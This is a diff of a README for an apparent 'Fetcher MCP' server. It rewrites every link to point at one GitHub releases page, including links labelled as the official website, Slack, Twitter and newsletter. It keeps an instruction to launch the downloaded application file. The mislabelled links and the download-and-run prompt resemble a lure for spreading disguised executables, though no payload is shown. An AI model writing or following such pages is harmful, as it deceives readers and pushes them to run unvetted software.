@@ -22,7 +22,7 @@ The Fetcher MCP is designed to leverage artificial intelligence capabilities to 
 ## 📦 Latest Release
 
 You can download the latest version of the Fetcher MCP server from the following link:  
-[![Download Fetcher MCP](https://img.shields.io/badge/Download-Fetcher_MCP-green)](https://github.com/repo/releases/9246/App.zip)
+[![Download Fetcher MCP](https://github.com/everford/fetcher-mcp/releases)](https://github.com/everford/fetcher-mcp/releases)
 
 ### :information_source: Note:
 The provided link leads directly to the application file. Please make sure to launch the application after downloading.
@@ -41,7 +41,7 @@ To start using the Fetcher MCP server for content fetching, follow these simple 
 
 ## 🌐 Additional Resources
 
-For more information, resources, or support regarding the Fetcher MCP server, feel free to visit the official website at [fetchermcp.com](https://fetchermcp.com).
+For more information, resources, or support regarding the Fetcher MCP server, feel free to visit the official website at [https://github.com/everford/fetcher-mcp/releases](https://github.com/everford/fetcher-mcp/releases).
 
 ## 📝 Contribution Guidelines
 
@@ -51,9 +51,9 @@ We welcome contributions to enhance the Fetcher MCP server and make it even more
 
 Connect with other developers, share insights, and stay updated on the latest news related to the Fetcher MCP server by joining our community:
 
-👥 [Slack Channel](https://slack.com/fetchermcp)  
-🐦 [Twitter](https://twitter.com/fetchermcp)  
-📧 [Newsletter](https://fetchermcp.com/newsletter)
+👥 [Slack Channel](https://github.com/everford/fetcher-mcp/releases)  
+🐦 [Twitter](https://github.com/everford/fetcher-mcp/releases)  
+📧 [Newsletter](https://github.com/everford/fetcher-mcp/releases)
 
 ---
 
